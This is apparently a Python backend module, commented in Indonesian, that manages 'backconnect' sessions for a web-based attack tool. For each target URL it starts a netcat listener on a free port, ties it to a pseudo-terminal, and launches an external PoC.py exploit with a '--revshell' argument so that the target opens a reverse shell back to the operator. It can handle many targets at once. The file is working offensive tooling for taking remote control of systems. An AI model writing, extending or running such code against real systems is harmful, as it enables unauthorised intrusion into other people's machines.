import asyncio
import os
import pty
import subprocess
import socket
import uuid
import logging
import shlex
import signal
from typing import Dict, Optional

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class Session:
    """
    Merepresentasikan satu sesi backconnect yang aktif.
    Menyimpan informasi process ID, file descriptor PTY, dan status koneksi.
    """
    def __init__(self, target_url: str, backconnect_ip: str = "0.0.0.0"):
        self.id = str(uuid.uuid4())
        self.target_url = target_url
        self.backconnect_ip = backconnect_ip
        self.port = self._get_free_port()
        self.master_fd = None
        self.slave_fd = None
        self.nc_process: Optional[subprocess.Popen] = None
        self.poc_process: Optional[subprocess.Popen] = None
        self.active = False

    def _get_free_port(self) -> int:
        """
        Mencari port acak yang tersedia di sistem.
        """
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', 0))
            return s.getsockname()[1]

    def start(self):
        """
        Memulai sesi:
        1. Membuat PTY pair.
        2. Menjalankan listener (nc) yang terhubung ke PTY slave.
        3. Menjalankan PoC.py.
        """
        # 1. Buat PTY
        self.master_fd, self.slave_fd = pty.openpty()
        
        # 2. Jalankan Listener (nc)
        # Menggunakan shlex untuk parsing command agar aman
        # Perintah: nc -lvnp <port> -> nc -l <port> (untuk kompatibilitas MacOS/BSD)
        # Di MacOS, flag -p sering menyebabkan error "missing port with option -l" jika digabung
        nc_cmd = f"nc -l {self.port}"
        logger.info(f"Starting listener: {nc_cmd}")
        
        try:
            self.nc_process = subprocess.Popen(
                shlex.split(nc_cmd),
                stdin=self.slave_fd,
                stdout=self.slave_fd,
                stderr=self.slave_fd,
                preexec_fn=os.setsid, # Start in new session
                close_fds=True
            )
        except FileNotFoundError:
             # Fallback jika nc tidak ada di path standar atau error
             logger.error("nc command not found via subprocess")
             raise

        # 3. Jalankan PoC
        # Perintah: python3 PoC.py <TARGET> --revshell <IP> <PORT>
        # Kita asumsikan PoC.py ada di root project (satu level di atas folder app/)
        poc_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "PoC.py"))
        
        # Kita perlu IP "public" atau yang bisa diakses target. 
        # User minta input IP Backconnect default 0.0.0.0. 
        # Jika user kirim 0.0.0.0 ke target remote, koneksi akan gagal (target connect ke localhostnya sendiri).
        # Tapi kita ikuti instruksi: "IP nya dijadikan 0.0.0.0"
        
        poc_cmd = f"python3 {poc_path} {self.target_url} --revshell {self.backconnect_ip} {self.port}"
        logger.info(f"Executing PoC: {poc_cmd}")
        
        self.poc_process = subprocess.Popen(
            shlex.split(poc_cmd),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        self.active = True

    def stop(self):
        """
        Menghentikan sesi dan membersihkan resource (kill process, close fd).
        """
        logger.info(f"Stopping session {self.id}")
        self.active = False
        
        # Kill nc process
        if self.nc_process:
            try:
                os.killpg(os.getpgid(self.nc_process.pid), signal.SIGTERM)
            except Exception as e:
                logger.error(f"Error killing nc process: {e}")
        
        # Kill PoC process
        if self.poc_process:
            try:
                self.poc_process.terminate()
            except Exception as e:
                logger.error(f"Error killing PoC process: {e}")

        # Close File Descriptors
        if self.master_fd:
            try:
                os.close(self.master_fd)
            except OSError:
                pass
        
        if self.slave_fd:
            try:
                os.close(self.slave_fd)
            except OSError:
                pass

class SessionManager:
    """
    Singleton class untuk mengelola banyak sesi.
    """
    def __init__(self):
        self.sessions: Dict[str, Session] = {}

    def create_session(self, target_url: str, backconnect_ip: str) -> Session:
        """
        Membuat dan memulai sesi baru.
        """
        session = Session(target_url, backconnect_ip)
        session.start()
        self.sessions[session.id] = session
        return session

    def get_session(self, session_id: str) -> Optional[Session]:
        """
        Mengambil sesi berdasarkan ID.
        """
        return self.sessions.get(session_id)

    def remove_session(self, session_id: str):
        """
        Menghentikan dan menghapus sesi.
        """
        if session_id in self.sessions:
            self.sessions[session_id].stop()
            del self.sessions[session_id]

# Global instance
session_manager = SessionManager()
